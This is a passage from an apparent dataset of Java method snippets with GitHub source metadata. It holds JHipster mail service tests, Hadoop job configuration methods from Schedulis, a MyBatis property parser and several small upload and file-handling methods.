assertThat(message.getAllRecipients()[0].toString()).isEqualTo(\"john.doe@example.com\");\n        assertThat(message.getFrom()[0].toString()).isEqualTo(jHipsterProperties.getMail().getFrom());\n        assertThat(message.getContent()).isInstanceOf(String.class);\n        assertThat(message.getContent().toString()).isEqualTo(\"testContent\");\n        assertThat(message.getDataHandler().getContentType()).isEqualTo(\"text/plain; charset=UTF-8\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33050, "method_name": "testSendHtmlEmail", "class_name": "MailServiceIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSendHtmlEmail() throws Exception {\n        mailService.sendEmail(\"john.doe@example.com\", \"testSubject\", \"testContent\", false, true);\n        verify(javaMailSender).send(messageCaptor.capture());\n        MimeMessage message = messageCaptor.getValue();\n        assertThat(message.getSubject()).isEqualTo(\"testSubject\");\n        assertThat(message.getAllRecipients()[0].toString()).isEqualTo(\"john.doe@example.com\");\n        assertThat(message.getFrom()[0].toString()).isEqualTo(jHipsterProperties.getMail().getFrom());\n        assertThat(message.getContent()).isInstanceOf(String.class);\n        assertThat(message.getContent().toString()).isEqualTo(\"testContent\");\n        assertThat(message.getDataHandler().getContentType()).isEqualTo(\"text/html;charset=UTF-8\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33051, "method_name": "testSendMultipartEmail", "class_name": "MailServiceIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSendMultipartEmail() throws Exception {\n        mailService.sendEmail(\"john.doe@example.com\", \"testSubject\", \"testContent\", true, false);\n        verify(javaMailSender).send(messageCaptor.capture());\n        MimeMessage message = messageCaptor.getValue();\n        MimeMultipart mp = (MimeMultipart) message.getContent();\n        MimeBodyPart part = (MimeBodyPart) ((MimeMultipart) mp.getBodyPart(0).getContent()).getBodyPart(0);\n        ByteArrayOutputStream aos = new ByteArrayOutputStream();\n        part.writeTo(aos);\n        assertThat(message.getSubject()).isEqualTo(\"testSubject\");\n        assertThat(message.getAllRecipients()[0].toString()).isEqualTo(\"john.doe@example.com\");\n        assertThat(message.getFrom()[0].toString()).isEqualTo(jHipsterProperties.getMail().getFrom());\n        assertThat(message.getContent()).isInstanceOf(Multipart.class);\n        assertThat(aos.toString()).isEqualTo(\"\\r\\ntestContent\");\n        assertThat(part.getDataHandler().getContentType()).isEqualTo(\"text/plain; charset=UTF-8\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33052, "method_name": "testSendMultipartHtmlEmail", "class_name": "MailServiceIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSendMultipartHtmlEmail() throws Exception {\n        mailService.sendEmail(\"john.doe@example.com\", \"testSubject\", \"testContent\", true, true);\n        verify(javaMailSender).send(messageCaptor.capture());\n        MimeMessage message = messageCaptor.getValue();\n        MimeMultipart mp = (MimeMultipart) message.getContent();\n        MimeBodyPart part = (MimeBodyPart) ((MimeMultipart) mp.getBodyPart(0).getContent()).getBodyPart(0);\n        ByteArrayOutputStream aos = new ByteArrayOutputStream();\n        part.writeTo(aos);\n        assertThat(message.getSubject()).isEqualTo(\"testSubject\");\n        assertThat(message.getAllRecipients()[0].toString()).isEqualTo(\"john.doe@example.com\");\n        assertThat(message.getFrom()[0].toString()).isEqualTo(jHipsterProperties.getMail().getFrom());\n        assertThat(message.getContent()).isInstanceOf(Multipart.class);\n        assertThat(aos.toString()).isEqualTo(\"\\r\\ntestContent\");\n        assertThat(part.getDataHandler().getContentType()).isEqualTo(\"text/html;charset=UTF-8\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33053, "method_name": "testSendEmailFromTemplate", "class_name": "MailServiceIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSendEmailFromTemplate() throws Exception {\n        User user = new User();\n        user.setLogin(\"john\");\n        user.setEmail(\"john.doe@example.com\");\n        user.setLangKey(\"en\");\n        mailService.sendEmailFromTemplate(user, \"mail/testEmail\", \"email.test.title\");\n        verify(javaMailSender).send(messageCaptor.capture());\n        MimeMessage message = messageCaptor.getValue();\n        assertThat(message.getSubject()).isEqualTo(\"test title\");\n        assertThat(message.getAllRecipients()[0].toString()).isEqualTo(user.getEmail());\n        assertThat(message.getFrom()[0].toString()).isEqualTo(jHipsterProperties.getMail().getFrom());\n        assertThat(message.getContent().toString()).isEqualToNormalizingNewlines(\"<html>test title, http://127.0.0.1:8080, john</html>\\n\");\n        assertThat(message.getDataHandler().getContentType()).isEqualTo(\"text/html;charset=UTF-8\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33054, "method_name": "testSendActivationEmail", "class_name": "MailServiceIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSendActivationEmail() throws Exception {\n        User user = new User();\n        user.setLangKey(Constants.DEFAULT_LANGUAGE);\n        user.setLogin(\"john\");\n        user.setEmail(\"john.doe@example.com\");\n        mailService.sendActivationEmail(user);\n        verify(javaMailSender).send(messageCaptor.capture());\n        MimeMessage message = messageCaptor.getValue();\n        assertThat(message.getAllRecipients()[0].toString()).isEqualTo(user.getEmail());\n        assertThat(message.getFrom()[0].toString()).isEqualTo(jHipsterProperties.getMail().getFrom());\n        assertThat(message.getContent().toString()).isNotEmpty();\n        assertThat(message.getDataHandler().getContentType()).isEqualTo(\"text/html;charset=UTF-8\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33055, "method_name": "testCreationEmail", "class_name": "MailServiceIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreationEmail() throws Exception {\n        User user = new User();\n        user.setLangKey(Constants.DEFAULT_LANGUAGE);\n        user.setLogin(\"john\");\n        user.setEmail(\"john.doe@example.com\");\n        mailService.sendCreationEmail(user);\n        verify(javaMailSender).send(messageCaptor.capture());\n        MimeMessage message = messageCaptor.getValue();\n        assertThat(message.getAllRecipients()[0].toString()).isEqualTo(user.getEmail());\n        assertThat(message.getFrom()[0].toString()).isEqualTo(jHipsterProperties.getMail().getFrom());\n        assertThat(message.getContent().toString()).isNotEmpty();\n        assertThat(message.getDataHandler().getContentType()).isEqualTo(\"text/html;charset=UTF-8\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33056, "method_name": "testSendPasswordResetMail", "class_name": "MailServiceIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSendPasswordResetMail() throws Exception {\n        User user = new User();\n        user.setLangKey(Constants.DEFAULT_LANGUAGE);\n        user.setLogin(\"john\");\n        user.setEmail(\"john.doe@example.com\");\n        mailService.sendPasswordResetMail(user);\n        verify(javaMailSender).send(messageCaptor.capture());\n        MimeMessage message = messageCaptor.getValue();\n        assertThat(message.getAllRecipients()[0].toString()).isEqualTo(user.getEmail());\n        assertThat(message.getFrom()[0].toString()).isEqualTo(jHipsterProperties.getMail().getFrom());\n        assertThat(message.getContent().toString()).isNotEmpty();\n        assertThat(message.getDataHandler().getContentType()).isEqualTo(\"text/html;charset=UTF-8\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33057, "method_name": "testSendEmailWithException", "class_name": "MailServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSendEmailWithException() {\n        doThrow(MailSendException.class).when(javaMailSender).send(any(MimeMessage.class));\n        mailService.sendEmail(\"john.doe@example.com\", \"testSubject\", \"testContent\", false, false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33058, "method_name": "testSendLocalizedEmailForAllSupportedLanguages", "class_name": "MailServiceIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSendLocalizedEmailForAllSupportedLanguages() throws Exception {\n        User user = new User();\n        user.setLogin(\"john\");\n        user.setEmail(\"john.doe@example.com\");\n        for (String langKey : languages) {\n            user.setLangKey(langKey);\n            mailService.sendEmailFromTemplate(user, \"mail/testEmail\", \"email.test.title\");\n            verify(javaMailSender, atLeastOnce()).send(messageCaptor.capture());\n            MimeMessage message = messageCaptor.getValue();\n\n            String propertyFilePath = \"i18n/messages_\" + getJavaLocale(langKey) + \".properties\";\n            URL resource = this.getClass().getClassLoader().getResource(propertyFilePath);\n            File file = new File(new URI(Objects.requireNonNull(resource).getFile()).getPath());\n            Properties properties = new Properties();\n            properties.load(new InputStreamReader(new FileInputStream(file), StandardCharsets.UTF_8));\n\n            String emailTitle = (String) properties.get(\"email.test.title\");\n            assertThat(message.getSubject()).isEqualTo(emailTitle);\n            assertThat(message.getContent().toString()).isEqualToNormalizingNewlines(\"<html>\" + emailTitle + \", http://127.0.0.1:8080, john</html>\\n\");\n        }\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33059, "method_name": "getJavaLocale", "class_name": "MailServiceIT", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getJavaLocale(String langKey) {\n        String javaLangKey = langKey;\n        Matcher matcher2 = PATTERN_LOCALE_2.matcher(langKey);\n        if (matcher2.matches()) {\n            javaLangKey = matcher2.group(1) + \"_\" + matcher2.group(2).toUpperCase();\n        }\n        Matcher matcher3 = PATTERN_LOCALE_3.matcher(langKey);\n        if (matcher3.matches()) {\n            javaLangKey = matcher3.group(1) + \"_\" + matcher3.group(2) + \"_\" + matcher3.group(3).toUpperCase();\n        }\n        return javaLangKey;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33060, "method_name": "getJobConf", "class_name": "AbstractHadoopJob", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JobConf", "snippet": "  public JobConf getJobConf() {\n    return jobconf;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33061, "method_name": "getConf", "class_name": "AbstractHadoopJob", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Configuration", "snippet": "  public Configuration getConf() {\n    return conf;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33062, "method_name": "getJobName", "class_name": "AbstractHadoopJob", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getJobName() {\n    return this.jobName;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33063, "method_name": "run", "class_name": "AbstractHadoopJob", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void run() throws Exception {\n    JobConf conf = getJobConf();\n\n    if (System.getenv(HADOOP_TOKEN_FILE_LOCATION) != null) {\n      conf.set(MAPREDUCE_JOB_CREDENTIALS_BINARY,\n          System.getenv(HADOOP_TOKEN_FILE_LOCATION));\n    }\n\n    jobClient = new JobClient(conf);\n    runningJob = jobClient.submitJob(conf);\n    logger.info(\"See \" + runningJob.getTrackingURL() + \" for details.\");\n    jobClient.monitorAndPrintJob(conf, runningJob);\n\n    if (!runningJob.isSuccessful()) {\n      throw new Exception(\"Hadoop job:\" + getJobName() + \" failed!\");\n    }\n\n    // dump all counters\n    Counters counters = runningJob.getCounters();\n    for (String groupName : counters.getGroupNames()) {\n      Counters.Group group = counters.getGroup(groupName);\n      logger.info(\"Group: \" + group.getDisplayName());\n      for (Counter counter : group)\n        logger.info(counter.getDisplayName() + \":\\t\" + counter.getValue());\n    }\n    updateMapReduceJobState(conf);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33064, "method_name": "createJobConf", "class_name": "AbstractHadoopJob", "params": ["Class<Mapper>"], "throws": ["IOException", "URISyntaxException"], "modifiers": ["public"], "return_type": "JobConf", "snippet": "  public JobConf createJobConf(Class<? extends Mapper> mapperClass)\n      throws IOException, URISyntaxException {\n    JobConf conf = createJobConf(mapperClass, null);\n    conf.setNumReduceTasks(0);\n    return conf;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33065, "method_name": "createJobConf", "class_name": "AbstractHadoopJob", "params": ["Class<Mapper>", "Class<Reducer>", "Class<Reducer>"], "throws": ["IOException", "URISyntaxException"], "modifiers": ["public"], "return_type": "JobConf", "snippet": "  public JobConf createJobConf(Class<? extends Mapper> mapperClass,\n      Class<? extends Reducer> reducerClass,\n      Class<? extends Reducer> combinerClass) throws IOException,\n      URISyntaxException {\n    JobConf conf = createJobConf(mapperClass, reducerClass);\n    conf.setCombinerClass(combinerClass);\n    return conf;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33066, "method_name": "createJobConf", "class_name": "AbstractHadoopJob", "params": ["Class<Mapper>", "Class<Reducer>"], "throws": ["IOException", "URISyntaxException"], "modifiers": ["public"], "return_type": "JobConf", "snippet": "  public JobConf createJobConf(Class<? extends Mapper> mapperClass,\n      Class<? extends Reducer> reducerClass) throws IOException,\n      URISyntaxException {\n    JobConf conf = new JobConf();\n    // set custom class loader with custom find resource strategy.\n\n    conf.setJobName(getJobName());\n    conf.setMapperClass(mapperClass);\n    if (reducerClass != null) {\n      conf.setReducerClass(reducerClass);\n    }\n\n    if (props.getBoolean(\"is.local\", false)) {\n      conf.set(\"mapred.job.tracker\", \"local\");\n      conf.set(\"fs.default.name\", \"file:///\");\n      conf.set(\"mapred.local.dir\", \"/tmp/map-red\");\n\n      logger.info(\"Running locally, no hadoop jar set.\");\n    } else {\n      HadoopUtils.setClassLoaderAndJar(conf, getClass());\n      logger.info(\"Setting hadoop jar file for class:\" + getClass()\n          + \"  to \" + conf.getJar());\n      logger.info(\"*************************************************************************\");\n      logger.info(\"          Running on Real Hadoop Cluster(\"\n          + conf.get(\"mapred.job.tracker\") + \")           \");\n      logger.info(\"*************************************************************************\");\n    }\n\n    // set JVM options if present\n    if (props.containsKey(\"mapred.child.java.opts\")) {\n      conf.set(\"mapred.child.java.opts\",\n          props.getString(\"mapred.child.java.opts\"));\n      logger.info(\"mapred.child.java.opts set to \"\n          + props.getString(\"mapred.child.java.opts\"));\n    }\n\n    // set input and output paths if they are present\n    if (props.containsKey(\"input.paths\")) {\n      List<String> inputPaths = props.getStringList(\"input.paths\");\n      if (inputPaths.size() == 0)\n        throw new IllegalArgumentException(\n            \"Must specify at least one value for property 'input.paths'\");\n      for (String path : inputPaths) {\n        HadoopUtils.addAllSubPaths(conf, new Path(path));\n      }\n    }\n\n    if (props.containsKey(\"output.path\")) {\n      String location = props.get(\"output.path\");\n      FileOutputFormat.setOutputPath(conf, new Path(location));\n\n      // For testing purpose only remove output file if exists\n      if (props.getBoolean(\"force.output.overwrite\", false)) {\n        FileSystem fs =\n            FileOutputFormat.getOutputPath(conf).getFileSystem(conf);\n        fs.delete(FileOutputFormat.getOutputPath(conf), true);\n      }\n    }\n\n    // Adds External jars to hadoop classpath\n    String externalJarList = props.getString(\"hadoop.external.jarFiles\", null);\n    if (externalJarList != null) {\n      FileSystem fs = FileSystem.get(conf);\n      String[] jarFiles = externalJarList.split(\",\");\n      for (String jarFile : jarFiles) {\n        logger.info(\"Adding extenral jar File:\" + jarFile);\n        DistributedCache.addFileToClassPath(new Path(jarFile), conf, fs);\n      }\n    }\n\n    // Adds distributed cache files\n    String cacheFileList = props.getString(\"hadoop.cache.files\", null);\n    if (cacheFileList != null) {\n      String[] cacheFiles = cacheFileList.split(\",\");\n      for (String cacheFile : cacheFiles) {\n        logger.info(\"Adding Distributed Cache File:\" + cacheFile);\n        DistributedCache.addCacheFile(new URI(cacheFile), conf);\n      }\n    }\n\n    // Adds distributed cache files\n    String archiveFileList = props.getString(\"hadoop.cache.archives\", null);\n    if (archiveFileList != null) {\n      String[] archiveFiles = archiveFileList.split(\",\");\n      for (String archiveFile : archiveFiles) {\n        logger.info(\"Adding Distributed Cache Archive File:\" + archiveFile);\n        DistributedCache.addCacheArchive(new URI(archiveFile), conf);\n      }\n    }\n\n    String hadoopCacheJarDir =\n        props.getString(\"hdfs.default.classpath.dir\", null);\n    if (hadoopCacheJarDir != null) {\n      FileSystem fs = FileSystem.get(conf);\n      if (fs != null) {\n        FileStatus[] status = fs.listStatus(new Path(hadoopCacheJarDir));\n\n        if (status != null) {\n          for (int i = 0; i < status.length; ++i) {\n            if (!status[i].isDir()) {\n              Path path =\n                  new Path(hadoopCacheJarDir, status[i].getPath().getName());\n              logger.info(\"Adding Jar to Distributed Cache Archive File:\"\n                  + path);\n\n              DistributedCache.addFileToClassPath(path, conf, fs);\n            }\n          }\n        } else {\n          logger.info(\"hdfs.default.classpath.dir \" + hadoopCacheJarDir\n              + \" is empty.\");\n        }\n      } else {\n        logger.info(\"hdfs.default.classpath.dir \" + hadoopCacheJarDir\n            + \" filesystem doesn't exist\");\n      }\n    }\n\n    for (String key : getProps().getKeySet()) {\n      String lowerCase = key.toLowerCase();\n      if (lowerCase.startsWith(HADOOP_PREFIX)) {\n        String newKey = key.substring(HADOOP_PREFIX.length());\n        conf.set(newKey, getProps().get(key));\n      }\n    }\n\n    HadoopUtils.setPropsInJob(conf, getProps());\n\n    // put in tokens\n    if (System.getenv(HADOOP_TOKEN_FILE_LOCATION) != null) {\n      conf.set(MAPREDUCE_JOB_CREDENTIALS_BINARY,\n          System.getenv(HADOOP_TOKEN_FILE_LOCATION));\n    }\n\n    return conf;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33067, "method_name": "getProps", "class_name": "AbstractHadoopJob", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props getProps() {\n    return this.props;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33068, "method_name": "cancel", "class_name": "AbstractHadoopJob", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void cancel() throws Exception {\n    if (runningJob != null) {\n      runningJob.killJob();\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33069, "method_name": "updateMapReduceJobState", "class_name": "AbstractHadoopJob", "params": ["JobConf"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void updateMapReduceJobState(JobConf jobConf) {\n    if (runningJob == null || visualizer == false) {\n      return;\n    }\n\n    try {\n      JobID jobId = runningJob.getID();\n      TaskReport[] mapTaskReport = jobClient.getMapTaskReports(jobId);\n      TaskReport[] reduceTaskReport = jobClient.getReduceTaskReports(jobId);\n      mapReduceJobState =\n          new MapReduceJobState(runningJob, mapTaskReport, reduceTaskReport);\n      writeMapReduceJobState(jobConf);\n    } catch (IOException e) {\n      logger.error(\"Cannot update MapReduceJobState\");\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33070, "method_name": "statsToJson", "class_name": "AbstractHadoopJob", "params": ["JobConf"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "  private Object statsToJson(JobConf jobConf) {\n    List<Object> jsonObj = new ArrayList<Object>();\n    Map<String, Object> jobJsonObj = new HashMap<String, Object>();\n    Properties conf = StatsUtils.getJobConf(jobConf);\n    jobJsonObj.put(\"state\", mapReduceJobState.toJson());\n    jobJsonObj.put(\"conf\", StatsUtils.propertiesToJson(conf));\n    jsonObj.add(jobJsonObj);\n    return jsonObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33071, "method_name": "writeMapReduceJobState", "class_name": "AbstractHadoopJob", "params": ["JobConf"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void writeMapReduceJobState(JobConf jobConf) {\n    File mrStateFile = null;\n    try {\n      mrStateFile = new File(jobStatsFileName);\n      JSONUtils.toJSON(statsToJson(jobConf), mrStateFile);\n    } catch (Exception e) {\n      logger.error(\"Cannot write JSON file.\");\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33072, "method_name": "getProgress", "class_name": "AbstractHadoopJob", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "double", "snippet": "  public double getProgress() throws IOException {\n    if (runningJob == null) {\n      return 0.0;\n    }\n    return (double) (runningJob.mapProgress() + runningJob.reduceProgress()) / 2.0d;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33073, "method_name": "getCounters", "class_name": "AbstractHadoopJob", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Counters", "snippet": "  public Counters getCounters() throws IOException {\n    return runningJob.getCounters();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/AbstractHadoopJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33074, "method_name": "parse", "class_name": "PropertyParser", "params": ["String", "Properties"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String parse(String string, Properties variables) {\n    VariableTokenHandler handler = new VariableTokenHandler(variables);\n    GenericTokenParser parser = new GenericTokenParser(\"${\", \"}\", handler);\n    return parser.parse(string);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/PropertyParser.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33075, "method_name": "getPropertyValue", "class_name": "VariableTokenHandler", "params": ["String", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getPropertyValue(String key, String defaultValue) {\n      return (variables == null) ? defaultValue : variables.getProperty(key, defaultValue);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/PropertyParser.java", "stars": "15", "class_props": {"extends": null, "implements": ["TokenHandler"], "modifiers": ["private", "static"]}}, {"id": 33076, "method_name": "handleToken", "class_name": "VariableTokenHandler", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String handleToken(String content) {\n      if (variables != null) {\n        String key = content;\n        if (enableDefaultValue) {\n          final int separatorIndex = content.indexOf(defaultValueSeparator);\n          String defaultValue = null;\n          if (separatorIndex >= 0) {\n            key = content.substring(0, separatorIndex);\n            defaultValue = content.substring(separatorIndex + defaultValueSeparator.length());\n          }\n          if (defaultValue != null) {\n            return variables.getProperty(key, defaultValue);\n          }\n        }\n        if (variables.containsKey(key)) {\n          return variables.getProperty(key);\n        }\n      }\n      return \"${\" + content + \"}\";\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/PropertyParser.java", "stars": "15", "class_props": {"extends": null, "implements": ["TokenHandler"], "modifiers": ["private", "static"]}}, {"id": 33077, "method_name": "uploadFile", "class_name": "QiniuServiceTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void uploadFile() {\n        File file = new File(\"F:\\\\idea\\\\rent-house\\\\tmp\\\\test.jpg\");\n        Assert.isTrue(file.exists(), \"\u6587\u4ef6\u4e0d\u5b58\u5728\");\n\n        try {\n            Response response = qiniuService.uploadFile(file);\n            Assert.isTrue(response.isOK(), \"\u6587\u4ef6\u4e0a\u4f20\u5931\u8d25\");\n        } catch (QiniuException e) {\n            e.printStackTrace();\n            Assert.isTrue(false, \"\u6587\u4ef6\u4e0a\u4f20\u5931\u8d25\");\n        }\n    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/test/java/com/harry/renthouse/service/house/QiniuServiceTest.java", "stars": "3", "class_props": {"extends": "RentHouseApplicationTests", "implements": null, "modifiers": []}}, {"id": 33078, "method_name": "testUploadFile", "class_name": "QiniuServiceTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testUploadFile() {\n        try {\n            Response resp = qiniuService.deleteFile(\"Fox8sEemX6ibXvjNGoX4grYSiHJ4\");\n            Assert.isTrue(resp.isOK(), \"\u6587\u4ef6\u5220\u9664\u5931\u8d25\");\n        } catch (QiniuException e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/test/java/com/harry/renthouse/service/house/QiniuServiceTest.java", "stars": "3", "class_props": {"extends": "RentHouseApplicationTests", "implements": null, "modifiers": []}}, {"id": 33079, "method_name": "deleteFile", "class_name": "QiniuServiceTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void deleteFile() {\n    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/test/java/com/harry/renthouse/service/house/QiniuServiceTest.java", "stars": "3", "class_props": {"extends": "RentHouseApplicationTests", "implements": null, "modifiers": []}}, {"id": 33080, "method_name": "close", "class_name": "FileManager", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void close() throws IOException {\n\t\twriter.close();\n\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/file/FileManager.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33081, "method_name": "writeToFile", "class_name": "FileManager", "params": ["String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void writeToFile(String string) throws IOException {\n\t\twriter.write(string);\n\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/file/FileManager.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33082, "method_name": "main", "class_name": "ArraySort", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tint[] ns = { 28, 12, 89, 73, 65, 18, 96, 50, 8, 36 };\n\t\t// 